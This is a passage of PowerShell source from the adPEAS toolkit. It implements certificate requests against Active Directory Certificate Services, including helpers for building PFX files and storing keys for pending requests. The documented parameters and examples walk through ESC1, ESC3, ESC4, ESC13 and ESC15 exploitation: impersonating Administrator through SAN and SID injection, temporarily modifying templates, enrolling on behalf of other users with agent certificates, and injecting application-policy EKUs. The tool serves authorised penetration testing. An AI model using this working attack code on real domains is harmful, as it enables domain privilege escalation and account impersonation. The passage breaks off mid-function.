            $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
        }
        $certWithKey.Dispose()
        Write-Log "$FunctionPrefix Built PFX ($($pfxBytes.Length) bytes)"
    }
    catch {
        Write-Log "$FunctionPrefix CopyWithPrivateKey failed: $_"
        Write-Warning "[!] Failed to create PFX. .NET Framework 4.7.2+ is required."
        return $null
    }

    # Resolve output path
    if (-not $OutputPath) {
        # Extract CN from the ISSUED certificate (CA may override the requested subject)
        $cnForFile = if ($IssuedCert.Subject -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
        $pfxTimestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $OutputPath = "${cnForFile}_${pfxTimestamp}.pfx"
        Write-Log "$FunctionPrefix Derived output path: $OutputPath"
    }

    $exportResult = Export-adPEASFile -Path $OutputPath -Content $pfxBytes -Type Binary -SanitizeFilename -Force:$Force
    if (-not $exportResult.Success) {
        Write-Warning "[!] Failed to save PFX: $($exportResult.Message)"
        return $null
    }
    $OutputPath = $exportResult.Path

    # Display results
    Show-Line "Certificate saved as PFX:" -Class Hint
    Show-KeyValue "PFX Path:" $OutputPath
    if ($pfxPassword) {
        Show-KeyValue "PFX Password:" $pfxPassword
    } else {
        Show-KeyValue "PFX Password:" "(none)" -Class Note
    }
    Show-KeyValue "Thumbprint:" $IssuedCert.Thumbprint
    Show-KeyValue "Subject:" $IssuedCert.Subject
    Show-KeyValue "Issuer:" $IssuedCert.Issuer
    Show-KeyValue "Valid Until:" $IssuedCert.NotAfter.ToString("yyyy-MM-dd")
    if ($TemplateName) {
        Show-KeyValue "Template:" $TemplateName
    }

    # Show SANs from issued certificate
    $sanExt = $IssuedCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
    if ($sanExt) {
        Show-KeyValue "SAN:" $sanExt.Format($false)
    }
    # Show NTDS CA Security (SID) extension presence - confirms strong mapping
    $sidExt = $IssuedCert.Extensions | Where-Object { $_.Oid.Value -eq '1.3.6.1.4.1.311.25.2' }
    if ($sidExt) {
        Show-KeyValue "SID Extension:" "present (strong mapping enabled)"
    }

    Show-EmptyLine

    # Show usage hints
    $domainHint = if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) { $Script:LDAPContext['Domain'] } else { '<domain>' }
    Show-Line "Usage with Connect-adPEAS:" -Class Note
    if ($pfxPassword) {
        Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath' -CertificatePassword '$pfxPassword'"
    } else {
        Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath'"
    }

    # Save certificate properties before disposing
    $certThumbprint = $IssuedCert.Thumbprint
    $certSubject = $IssuedCert.Subject
    $certIssuer = $IssuedCert.Issuer
    $IssuedCert.Dispose()

    return [PSCustomObject]@{
        Success     = $true
        Status      = 'Issued'
        RequestID   = $RequestID
        PFXPath     = $OutputPath
        PFXPassword = if ($pfxPassword) { $pfxPassword } else { $null }
        Thumbprint  = $certThumbprint
        Subject     = $certSubject
        Issuer      = $certIssuer
        Template    = $TemplateName
        CAServer    = $CAServer
    }
}

<#
.SYNOPSIS
    Serializes an RSA private key (plus request metadata) to a JSON sidecar so a
    pending certificate request can be completed later with -RetrieveID.
.NOTES
    The key is written in cleartext. Protect or delete the file after use.
#>
function Save-PendingPrivateKey {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [System.Security.Cryptography.RSA]$RSA,

        [Parameter(Mandatory)]
        $RequestID,

        [string]$Subject,
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$OutputPath,

        [switch]$Force
    )

    $FunctionPrefix = "[Save-PendingPrivateKey]"
    $p = $RSA.ExportParameters($true)

    $obj = [PSCustomObject]@{
        Type      = 'adPEAS-PendingKey'
        Version   = 1
        RequestID = $RequestID
        Subject   = $Subject
        CAServer  = $CAServer
        Modulus   = [Convert]::ToBase64String($p.Modulus)
        Exponent  = [Convert]::ToBase64String($p.Exponent)
        D         = [Convert]::ToBase64String($p.D)
        P         = [Convert]::ToBase64String($p.P)
        Q         = [Convert]::ToBase64String($p.Q)
        DP        = [Convert]::ToBase64String($p.DP)
        DQ        = [Convert]::ToBase64String($p.DQ)
        InverseQ  = [Convert]::ToBase64String($p.InverseQ)
    }

    $json = $obj | ConvertTo-Json
    $exportResult = Export-adPEASFile -Path $OutputPath -Content $json -Type Text -SanitizeFilename -Force:$Force
    if (-not $exportResult.Success) {
        throw "Failed to write key file: $($exportResult.Message)"
    }
    Write-Log "$FunctionPrefix Saved pending private key to $($exportResult.Path)"
    return $exportResult.Path
}

<#
.SYNOPSIS
    Reconstructs an RSA private key from a JSON sidecar written by Save-PendingPrivateKey.
#>
function Restore-PendingPrivateKey {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$KeyFile
    )

    $FunctionPrefix = "[Restore-PendingPrivateKey]"

    if (-not (Test-Path -Path $KeyFile)) {
        throw "Key file not found: $KeyFile"
    }

    $j = Get-Content -Path $KeyFile -Raw | ConvertFrom-Json
    if ($j.Type -ne 'adPEAS-PendingKey') {
        throw "Unrecognized key file format: $KeyFile"
    }

    $p = New-Object System.Security.Cryptography.RSAParameters
    $p.Modulus  = [Convert]::FromBase64String($j.Modulus)
    $p.Exponent = [Convert]::FromBase64String($j.Exponent)
    $p.D        = [Convert]::FromBase64String($j.D)
    $p.P        = [Convert]::FromBase64String($j.P)
    $p.Q        = [Convert]::FromBase64String($j.Q)
    $p.DP       = [Convert]::FromBase64String($j.DP)
    $p.DQ       = [Convert]::FromBase64String($j.DQ)
    $p.InverseQ = [Convert]::FromBase64String($j.InverseQ)

    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportParameters($p)

    Write-Log "$FunctionPrefix Restored private key from $KeyFile (RequestID=$($j.RequestID))"
    return [PSCustomObject]@{
        RSA       = $rsa
        RequestID = $j.RequestID
        Subject   = $j.Subject
        CAServer  = $j.CAServer
    }
}

<#
.SYNOPSIS
    Retrieves a previously submitted certificate request by ID and pairs it with the
    saved private key into a PFX. Backs the -RetrieveID mode of Request-ADCSCertificate.
#>
function Invoke-ADCSRetrieve {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [int]$RetrieveID,

        [string]$KeyFile,
        [string]$CAServer,
        [PSCredential]$Credential,
        [switch]$UseHTTP,
        [int]$Port = 0,
        [string]$OutputPath,
        [switch]$NoPassword,
        [switch]$PassThru,
        [switch]$Force
    )

    $FunctionPrefix = "[Invoke-ADCSRetrieve]"

    if ([string]::IsNullOrEmpty($CAServer)) {
        Write-Warning "[!] -RetrieveID requires -CAServer (the CA host that issued the request)."
        return $null
    }
    if ([string]::IsNullOrEmpty($KeyFile)) {
        Write-Warning "[!] -RetrieveID requires -KeyFile (the *.key.json saved when the request went pending)."
        return $null
    }

    # Restore the private key
    try {
        $restored = Restore-PendingPrivateKey -KeyFile $KeyFile
    }
    catch {
        Write-Warning "[!] $_"
        return $null
    }
    $rsa = $restored.RSA

    try {
        Show-Line "Retrieving certificate (Request ID: $RetrieveID) from CA '$CAServer'" -Class Note

        # Try HTTPS then HTTP unless -UseHTTP forces HTTP
        $httpModes = if ($UseHTTP) { @($true) } else { @($false, $true) }
        $issuedCert = $null
        foreach ($httpMode in $httpModes) {
            Write-Log "$FunctionPrefix Attempting retrieval (http=$httpMode)"
            $issuedCert = Get-CertsrvCertificate -CAServer $CAServer -RequestID $RetrieveID `
                -Credential $Credential -UseHTTP:$httpMode -Port $Port
            if ($issuedCert) { break }
        }

        if (-not $issuedCert) {
            Write-Warning "[!] Failed to retrieve certificate for Request ID $RetrieveID (not yet approved, denied, or wrong CA?)."
            return $null
        }

        $pfxResult = Save-IssuedCertificatePFX -IssuedCert $issuedCert -RSA $rsa `
            -OutputPath $OutputPath -NoPassword:$NoPassword `
            -RequestID $RetrieveID -CAServer $CAServer -Force:$Force
        if (-not $pfxResult) {
            return $null
        }
        if ($PassThru) {
            return $pfxResult
        }
    }
    finally {
        if ($rsa) { $rsa.Dispose() }
    }
}

#endregion

#region ===== MAIN FUNCTION =====

function Request-ADCSCertificate {
<#
.SYNOPSIS
    Requests a certificate from an ADCS Certificate Authority.

.DESCRIPTION
    Generates a PKCS#10 CSR, submits it to a Certificate Authority, and saves the issued certificate as a PFX file.

    Supports multiple submission methods with automatic fallback:
    1. HTTPS Web Enrollment (/certsrv/) - Primary method
    2. HTTP Web Enrollment (/certsrv/) - Fallback if HTTPS unavailable
    3. ICertRequest COM/RPC - Fallback if Web Enrollment unavailable/blocked

    Supports authentication via:
    - Current Windows context (DefaultCredentials) including PTT-injected Kerberos tickets
    - Explicit PSCredential for NTLM/Negotiate authentication

    The function can auto-discover CAs from Active Directory when connected via Connect-adPEAS, or target a specific CA server directly.

.PARAMETER CAServer
    FQDN of the CA server (e.g., "ca01.contoso.com").
    If not specified, auto-discovers from AD using Get-CertificateAuthority.

.PARAMETER CAName
    Logical CA name (e.g., "CONTOSO-CA01-CA"). Required for the COM/RPC method when
    using an explicit -CAServer; auto-filled from AD discovery otherwise.

.PARAMETER TemplateName
    Certificate template name (e.g., "User", "WebServer", "Machine").
    Required for a new request; omitted when using -RetrieveID.

.PARAMETER SID
    Object SID embedded in the NTDS CA Security Extension (1.3.6.1.4.1.311.25.2) for
    strong certificate mapping. Required for ESC1/ESC6 impersonation to authenticate
    against DCs with StrongCertificateBindingEnforcement (KB5014754, mandatory since
    Feb 2025). When omitted, the SID is auto-resolved via LDAP from the impersonated
    identity (UPN/DNS/Subject) if a session exists.

.PARAMETER NoSID
    Disable SID resolution/embedding entirely (e.g., for templates/CAs where the SID
    extension is undesired).

.PARAMETER Method
    Submission transport: Auto (default; Web first, COM/RPC fallback when Web
    Enrollment is absent), Web (certsrv only), or COM (ICertRequest DCOM only).

.PARAMETER Port
    Custom TCP port for the certsrv Web Enrollment endpoint. Default 0 uses the
    scheme default (80 for HTTP, 443 for HTTPS). Combine with -UseHTTP for plain
    HTTP on a non-standard port.

.PARAMETER RetrieveID
    Retrieve a previously submitted request by ID (after manager approval) and pair
    it with the saved private key (-KeyFile) into a PFX. Requires -CAServer and -KeyFile.

.PARAMETER KeyFile
    Path to the *.key.json sidecar written when a request went pending. Used with
    -RetrieveID to reconstruct the private key.

.PARAMETER OnBehalfOf
    ESC3 exploitation: request a certificate on behalf of this principal
    (format "DOMAIN\user"). Requires -PFX pointing to an enrollment-agent
    certificate that holds the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
    The inner CSR is wrapped in a PKCS#7 SignedData signed by the agent certificate.

.PARAMETER PFX
    Path or Base64 of the enrollment-agent PKCS#12/PFX (certificate + private key)
    used to sign an -OnBehalfOf request.

.PARAMETER PFXPassword
    Password protecting the -PFX enrollment-agent certificate.

.PARAMETER Impersonate
    Convenience parameter for ESC1/ESC4 exploitation. Accepts a username, UPN, or
    FQDN and automatically sets Subject and the appropriate SAN type.

    Accepted formats:
    - "administrator"              - Username only; domain appended, creates UPN SAN
    - "administrator@contoso.com"  - Full UPN; used as-is, creates UPN SAN
    - "srv-dc.contoso.com"         - FQDN; creates DNS SAN (for computer accounts)

    User example: -Impersonate "administrator" is equivalent to -Subject "CN=administrator" -UPN "administrator@contoso.com"
    Computer example: -Impersonate "srv-dc.contoso.com" is equivalent to -Subject "CN=srv-dc" -DNS "srv-dc.contoso.com"

.PARAMETER Subject
    Certificate subject name. The "CN=" prefix is added automatically if omitted.
    Default: current user from session.

    Accepted formats:
    - "Administrator"           - Becomes CN=Administrator
    - "CN=Administrator"        - Used as-is
    - "CN=Admin,O=Contoso"      - Full DN, used as-is

.PARAMETER UPN
    User Principal Name for Subject Alternative Name (e.g., "administrator@contoso.com").
    Added as otherName SAN with Microsoft UPN OID (1.3.6.1.4.1.311.20.2.3).

.PARAMETER DNS
    DNS hostname for Subject Alternative Name (e.g., "dc01.contoso.com").
    Added as dNSName SAN.

.PARAMETER AlternativeNames
    Raw Subject Alternative Names with type prefix. For advanced use cases.
    Supported formats: "UPN:user@domain.com", "DNS:host.domain.com", "URL:..."
    Prefer -UPN and -DNS parameters for simpler usage.

.PARAMETER ApplicationPolicies
    ESC13/ESC15 (EKUwu / CVE-2024-49019): inject Microsoft Application Policy OIDs
    into the request via the szOID_APPLICATION_CERT_POLICIES extension
    (1.3.6.1.4.1.311.21.10). On schema-v1 templates these are not sanitised, so EKUs
    the template does not list can be obtained. Accepts raw OIDs or friendly names:
    "Client Authentication", "Server Authentication", "Smart Card Logon",
    "Certificate Request Agent", "Code Signing", "PKINIT Client Authentication",
    "Secure Email", "Any Purpose".

.PARAMETER KeyLength
    RSA key length in bits. Default: 2048. Valid: 1024, 2048, 4096.

.PARAMETER OutputPath
    Path for the PFX file. Default: "<SubjectCN>_<timestamp>.pfx" in current directory.

.PARAMETER Credential
    PSCredential for HTTP authentication against the certsrv endpoint.
    If not specified, uses current Windows context (DefaultCredentials).

.PARAMETER Domain
    Target domain FQDN for CA auto-discovery. Uses session domain if not specified.

.PARAMETER Server
    Specific Domain Controller for LDAP queries during CA auto-discovery.

.PARAMETER ModifyTemplate
    ESC4 exploitation: temporarily modifies the certificate template to allow
    arbitrary subject names (ENROLLEE_SUPPLIES_SUBJECT), adds Client Authentication
    EKU, enables exportable private keys, and removes manager approval.

    The workflow:
    1. Backs up the original template configuration to a JSON file
    2. Modifies the template to be ESC1-exploitable
    3. Requests the certificate with the specified subject/SAN
    4. Restores the original template from backup

    Requires WriteDACL, WriteProperty, or GenericAll permissions on the template.
    The backup file is kept after successful restore for audit purposes.

.PARAMETER UseHTTP
    Use HTTP instead of HTTPS for certsrv requests. Less secure, but works
    when HTTPS is unavailable on the CA server.

.PARAMETER NoPassword
    Export the PFX file without password protection. This allows using the
    certificate directly with Get-CertificateInfo or Connect-adPEAS without
    specifying -CertificatePassword.

.PARAMETER PassThru
    Returns the result as a PSCustomObject to the pipeline instead of only
    displaying console output. Useful for scripting and automation.

.PARAMETER Force
    Overwrite existing PFX file without prompting.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "User"
    Requests a certificate using the "User" template with auto-discovered CA.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Credential (Get-Credential)
    Requests a certificate with explicit CA server and credentials.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"
    ESC1 exploitation: requests a certificate as Administrator. Domain suffix is auto-appended from session.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -Subject "Administrator" -UPN "administrator@contoso.com"
    ESC1 exploitation with explicit subject and UPN SAN.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"
    ESC4 exploitation: temporarily modifies the template, requests a cert as Administrator, then restores the original template.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -Subject "dc01.contoso.com" -DNS "dc01.contoso.com"
    Requests a machine certificate with DNS SAN.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -UPN "administrator@contoso.com" -SID "S-1-5-21-1-2-3-500"
    ESC1 with an explicit SID embedded for strong mapping against patched DCs.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -CAName "CONTOSO-CA01-CA" -TemplateName "User" -Method COM
    Forces the COM/RPC (ICertRequest DCOM) transport - useful when Web Enrollment (/certsrv/) is not installed.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "WebServer" -ApplicationPolicies "Client Authentication" -UPN "administrator@contoso.com"
    ESC15 (EKUwu): inject the Client Authentication EKU on a schema-v1 template to get an auth-capable cert as Administrator.

.EXAMPLE
    # ESC15 variant B: turn a schema-v1 cert into an enrollment agent, then chain ESC3
    Request-ADCSCertificate -TemplateName "WebServer" -ApplicationPolicies "Certificate Request Agent" -NoPassword
    Request-ADCSCertificate -TemplateName "User" -OnBehalfOf "CONTOSO\Administrator" -PFX ".\webserver.pfx"

.EXAMPLE
    # ESC3 step 1: enroll for an enrollment-agent certificate
    Request-ADCSCertificate -TemplateName "EnrollmentAgent" -NoPassword -PassThru
    # ESC3 step 2: use the agent cert to request as Administrator on their behalf
    Request-ADCSCertificate -TemplateName "User" -OnBehalfOf "CONTOSO\Administrator" -PFX ".\agent.pfx"
    Enroll-on-behalf-of (ESC3): the agent certificate signs a request for the target principal.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -UseHTTP -Port 8080
    Requests over plain HTTP on a non-standard certsrv port (no HTTPS attempt).

.EXAMPLE
    Request-ADCSCertificate -RetrieveID 1337 -CAServer "ca01.contoso.com" -KeyFile ".\administrator_req1337.key.json"
    Retrieves a previously pending request after approval and builds the PFX with the saved key.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [string]$CAServer,

        # Logical CA name (e.g. "CONTOSO-CA01-CA") - required for COM/RPC against an
        # explicit -CAServer; auto-filled from AD discovery otherwise.
        [string]$CAName,

        # Template is mandatory for a new request, but not for -RetrieveID.
        # Validated manually in the body so -RetrieveID can omit it.
        [string]$TemplateName,

        [string]$Impersonate,

        [Alias('SubjectName')]
        [string]$Subject,

        [string]$UPN,

        [string[]]$DNS,

        # Object SID embedded in the NTDS CA Security Extension for strong mapping
        # (required for ESC1/ESC6 impersonation against patched DCs). Auto-resolved
        # from the impersonated identity when omitted and an LDAP session exists.
        [string]$SID,

        # Disable automatic SID resolution/embedding entirely.
        [switch]$NoSID,

        # ESC13/ESC15: inject Microsoft Application Policy OIDs or friendly names
        # (e.g. "Client Authentication", "Certificate Request Agent") into the request.
        [string[]]$ApplicationPolicies,

        [string[]]$AlternativeNames,

        [ValidateSet(1024, 2048, 4096)]
        [int]$KeyLength = 2048,

        # Submission transport: Auto (web first, COM/RPC fallback), Web (certsrv
        # only), or COM (ICertRequest DCOM only).
        [ValidateSet('Auto', 'Web', 'COM')]
        [string]$Method = 'Auto',

        # Custom TCP port for the certsrv Web Enrollment endpoint. 0 = scheme default
        # (80 for HTTP, 443 for HTTPS).
        [ValidateRange(0, 65535)]
        [int]$Port = 0,

        # Retrieve a previously submitted (pending/issued) request by ID and pair it
        # with the saved private key (see -KeyFile) into a PFX.
        [int]$RetrieveID,

        # Path to the *.key.json sidecar written for a pending request.
        [string]$KeyFile,

        # ESC3: request a certificate on behalf of this principal (DOMAIN\user) using
        # an enrollment-agent certificate supplied via -PFX. The agent cert must hold
        # the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
        [string]$OnBehalfOf,

        # Path or Base64 of the enrollment-agent PKCS#12/PFX (cert + private key) used
        # to sign the -OnBehalfOf request.
        [string]$PFX,

        # Password for the -PFX enrollment-agent certificate.
        [string]$PFXPassword,

        [string]$OutputPath,

        [PSCredential]$Credential,

        [string]$Domain,
        [string]$Server,

        [switch]$ModifyTemplate,
        [switch]$UseHTTP,
        [switch]$NoPassword,
        [switch]$PassThru,
        [switch]$Force
    )

    process {
        $FunctionPrefix = "[Request-ADCSCertificate]"

        $isRetrieve = $PSBoundParameters.ContainsKey('RetrieveID')

        # Validate mandatory parameters depending on mode
        if (-not $isRetrieve -and [string]::IsNullOrEmpty($TemplateName)) {
            Write-Warning "[!] -TemplateName is required for a new certificate request."
            return $null
        }

        # === Retrieve mode: pick up a previously submitted request ===
        if ($isRetrieve) {
            return Invoke-ADCSRetrieve -RetrieveID $RetrieveID -KeyFile $KeyFile `
                -CAServer $CAServer -Credential $Credential -UseHTTP:$UseHTTP -Port $Port `
                -OutputPath $OutputPath -NoPassword:$NoPassword -PassThru:$PassThru -Force:$Force
        }

        # === Validate / load enroll-on-behalf-of (ESC3) agent certificate ===
        $oboAgentCert = $null
        if ($OnBehalfOf) {
            if ([string]::IsNullOrEmpty($PFX)) {
                Write-Warning "[!] -OnBehalfOf requires -PFX (enrollment-agent certificate + private key)."
                return $null
            }
            Write-Log "$FunctionPrefix Enroll-on-behalf-of mode for '$OnBehalfOf', loading agent certificate from '$PFX'"

            try {
                if (Test-Path -LiteralPath $PFX) {
                    $pfxBytesIn = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $PFX).Path)
                }
                else {
                    $pfxBytesIn = [Convert]::FromBase64String(($PFX -replace '\s', ''))
                }
            }
            catch {
                Write-Warning "[!] Failed to read -PFX '$PFX' (not a valid file path or Base64): $_"
                return $null
            }

            try {
                $pfxPwdIn = if ($PSBoundParameters.ContainsKey('PFXPassword')) { $PFXPassword } else { $null }
                $oboAgentCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 `
                    -ArgumentList ([byte[]]$pfxBytesIn), $pfxPwdIn, ([System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
            }
            catch {
                Write-Warning "[!] Failed to load agent certificate from -PFX (wrong password?): $_"
                return $null
            }

            if (-not $oboAgentCert.HasPrivateKey) {
                Write-Warning "[!] Agent certificate has no associated private key - cannot sign the on-behalf-of request."
                return $null
            }

            # Inform whether the agent cert advertises the Certificate Request Agent EKU
            $hasAgentEku = $false
            foreach ($ext in $oboAgentCert.Extensions) {
                if ($ext -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]) {
                    foreach ($eku in $ext.EnhancedKeyUsages) {
                        if ($eku.Value -eq '1.3.6.1.4.1.311.20.2.1') { $hasAgentEku = $true }
                    }
                }
            }
            if ($hasAgentEku) {
                Show-Line "Loaded enrollment-agent certificate '$($oboAgentCert.Subject)' (Certificate Request Agent EKU present)" -Class Note
            }
            else {
                Show-Line "Agent certificate '$($oboAgentCert.Subject)' does NOT advertise the Certificate Request Agent EKU - the CA may reject the request" -Class Hint
            }
        }

        # === Step 1: Determine CA Server ===
        # Tracks ordered list of CAs to try (for fallback)
        $candidateCAs = @()

        if ($CAServer) {
            # Explicit CA server - single candidate, no discovery needed.
            # Name carries the logical CA name (needed for COM/RPC); when -CAName is
            # not supplied it stays empty and only the Web method is available.
            Write-Log "$FunctionPrefix Explicit CA server '$CAServer' (CAName='$CAName')"
            $candidateCAs = @([PSCustomObject]@{
                Name            = $CAName
                DNSHostName     = $CAServer
                CertificateTemplates = @()
                _Explicit       = $true
            })
        }
        else {
            Write-Log "$FunctionPrefix No CA server specified, attempting auto-discovery"

            # Build connection params for LDAP queries
            $connectionParams = @{}
            if ($Domain) { $connectionParams['Domain'] = $Domain }
            if ($Server) { $connectionParams['Server'] = $Server }

            # Check LDAP connection - we only need it for read-only CA discovery.
            # If Ensure-LDAPConnection fails (e.g. TGT mismatch) but $Script:LdapConnection
            # still exists, proceed anyway - the LDAP session itself may still work.
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                if (-not $Script:LdapConnection) {
                    Write-Warning "[!] LDAP connection required for CA auto-discovery. Use Connect-adPEAS first or specify -CAServer."
                    return $null
                }
                Write-Log "$FunctionPrefix Ensure-LDAPConnection reported issues but LDAP session exists, attempting CA discovery anyway"
            }

            # Discover all CAs from Active Directory
            # Pass explicit Domain/Server from session context so Get-CertificateAuthority's
            # internal Ensure-LDAPConnection takes the explicit-params path (no TGT re-check,
            # no duplicate error output)
            $caQueryParams = @{}
            if ($Domain) {
                $caQueryParams['Domain'] = $Domain
            } elseif ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $caQueryParams['Domain'] = $Script:LDAPContext['Domain']
            }
            if ($Server) {
                $caQueryParams['Server'] = $Server
            } elseif ($Script:LDAPContext -and $Script:LDAPContext['Server']) {
                $caQueryParams['Server'] = $Script:LDAPContext['Server']
            }
            $allCAs = @(Get-CertificateAuthority @caQueryParams | Where-Object { -not $_._QueryError })
            if ($allCAs.Count -eq 0) {
                Write-Warning "[!] No Certificate Authorities found in Active Directory. Specify -CAServer manually."
                return $null
            }

            # Log all discovered CAs and their templates
            Show-Line "Found $($allCAs.Count) Certificate Authority(ies) in Active Directory" -Class Note
            foreach ($ca in $allCAs) {
                $templateCount = @($ca.CertificateTemplates).Count
                Write-Verbose "$FunctionPrefix CA '$($ca.Name)' ($($ca.DNSHostName)) - $templateCount published template(s)"
                foreach ($tmpl in ($ca.CertificateTemplates | Sort-Object)) {
                    Write-Verbose "$FunctionPrefix   - $tmpl"
                }
            }

            # Filter CAs that publish the requested template
            $matchingCAs = @($allCAs | Where-Object { $_.CertificateTemplates -contains $TemplateName })

            if ($matchingCAs.Count -eq 0) {
                Write-Warning "[!] Template '$TemplateName' is not published on any CA"
                $allTemplates = @($allCAs | ForEach-Object { $_.CertificateTemplates } | Sort-Object -Unique)
                if ($allTemplates.Count -gt 0) {
                    Show-Line "Available templates across all CAs:"
                    foreach ($tmpl in $allTemplates) {
                        Show-Line "  - $tmpl"
                    }
                }
                return $null
            }

            # Filter CAs with valid DNS hostname
            $candidateCAs = @($matchingCAs | Where-Object { $_.DNSHostName })
            if ($candidateCAs.Count -eq 0) {
                Write-Warning "[!] CAs publishing '$TemplateName' have no DNS hostname. Specify -CAServer manually."
                return $null
            }

            if ($candidateCAs.Count -gt 1) {
                Show-Line "$($candidateCAs.Count) CAs publish template '$TemplateName' - will try in order with automatic fallback:" -Class Note
                foreach ($ca in $candidateCAs) {
                    Show-Line "  - $($ca.Name) ($($ca.DNSHostName))"
                }
            }
            else {
                Show-Line "Auto-discovered CA: $($candidateCAs[0].Name) ($($candidateCAs[0].DNSHostName))" -Class Note
            }
        }

        # === Step 1b: Select a CA and submission method ===
        # For each candidate, determine the usable transport:
        #   - Web : /certsrv/ reachable (probed HTTPS first, then HTTP)
        #   - COM : ICertRequest DCOM, usable whenever the logical CA name is known
        # -Method controls which transports are eligible:
        #   Auto -> Web preferred, COM fallback when web enrollment is absent
        #   Web  -> Web only
        #   COM  -> COM only (no /certsrv/ probing; requires the CA name)
        $CAServer = $null
        $resolvedCAName = $null
        $resolvedMethod = $null
        $resolvedUseHTTP = $UseHTTP.IsPresent
        $lastError = $null

        $webEligible = ($Method -eq 'Auto' -or $Method -eq 'Web')
        $comEligible = ($Method -eq 'Auto' -or $Method -eq 'COM')

        # Build protocol list: -UseHTTP means only HTTP, otherwise try HTTPS then HTTP
        $protocolsToTry = if ($UseHTTP) { @('http') } else { @('https', 'http') }

        foreach ($candidateCA in $candidateCAs) {
            $testHost = $candidateCA.DNSHostName
            $candidateCAName = $candidateCA.Name
            $caSelected = $false

            # --- Try Web enrollment reachability ---
            if ($webEligible) {
                $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
                foreach ($protocol in $protocolsToTry) {
                    $testUrl = "${protocol}://${testHost}${portPart}/certsrv/"
                    Write-Log "$FunctionPrefix Probing Web Enrollment endpoint: $testUrl"

                    try {
                        $testRequest = [System.Net.HttpWebRequest]::Create($testUrl)
                        $testRequest.Method = 'HEAD'
                        $testRequest.Timeout = 5000
                        $testRequest.AllowAutoRedirect = $true

                        # Temporarily ignore SSL errors for reachability check
                        $origCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
                        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

                        if ($Credential) {
                            $testRequest.Credentials = $Credential.GetNetworkCredential()
                        }
                        else {
                            $testRequest.UseDefaultCredentials = $true
                        }

                        $testResponse = $null
                        try {
                            $testResponse = $testRequest.GetResponse()
                            $statusCode = [int]$testResponse.StatusCode
                        }
                        catch [System.Net.WebException] {
                            $webEx = $_.Exception
                            if ($webEx.Response) {
                                $statusCode = [int]$webEx.Response.StatusCode
                                try { $webEx.Response.Close() } catch { }
                                try { $webEx.Response.Dispose() } catch { }
                            }
                            else {
                                throw
                            }
                        }
                        finally {
                            if ($testResponse) {
                                try { $testResponse.Close() } catch { }
                                try { $testResponse.Dispose() } catch { }
                            }
                            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $origCallback
                        }

                        # 200/301/302/401/403 all mean the endpoint exists and is reachable
                        if ($statusCode -in @(200, 301, 302, 401, 403)) {
                            $CAServer = $testHost
                            $resolvedCAName = $candidateCAName
                            $resolvedMethod = 'Web'
                            $resolvedUseHTTP = ($protocol -eq 'http')
                            Write-Log "$FunctionPrefix Web Enrollment reachable: $testUrl (HTTP $statusCode) -> method=Web"
                            if ($protocol -eq 'http' -and -not $UseHTTP) {
                                Show-Line "HTTPS not available on '$testHost', falling back to HTTP" -Class Hint
                            }
                            $caSelected = $true
                            break
                        }
                        else {
                            $lastError = "HTTP $statusCode"
                            Write-Log "$FunctionPrefix Web Enrollment returned unexpected status: $testUrl - HTTP $statusCode"
                        }
                    }
                    catch {
                        $lastError = $_.Exception.Message
                        Write-Log "$FunctionPrefix Web Enrollment unreachable: $testUrl - $lastError"
                    }
                }
            }

            if ($caSelected) { break }

            # --- Fall back to COM/RPC for this CA (needs the logical CA name) ---
            if ($comEligible) {
                if ($candidateCAName) {
                    $CAServer = $testHost
                    $resolvedCAName = $candidateCAName
                    $resolvedMethod = 'COM'
                    if ($webEligible) {
                        Show-Line "Web Enrollment unavailable on '$testHost', using COM/RPC (ICertRequest) instead" -Class Hint
                    }
                    Write-Log "$FunctionPrefix Selected COM/RPC for CA '$candidateCAName' on '$testHost'"
                    $caSelected = $true
                    break
                }
                else {
                    $lastError = "COM/RPC requires the logical CA name (use -CAName)"
                    Write-Log "$FunctionPrefix Cannot use COM/RPC for '$testHost' - CA name unknown"
                }
            }

            # Nothing worked for this candidate
            if ($candidateCAs.Count -gt 1 -or -not $candidateCA._Explicit) {
                Show-Line "CA '$($candidateCA.Name)' ($testHost) not usable ($Method) - trying next CA" -Class Note
            }
        }

        if (-not $CAServer) {
            if ($Method -eq 'COM') {
                Write-Warning "[!] No CA usable via COM/RPC. Ensure the logical CA name is known (use -CAName with -CAServer). Last error: $lastError"
            }
            elseif ($candidateCAs.Count -eq 1 -and $candidateCAs[0]._Explicit) {
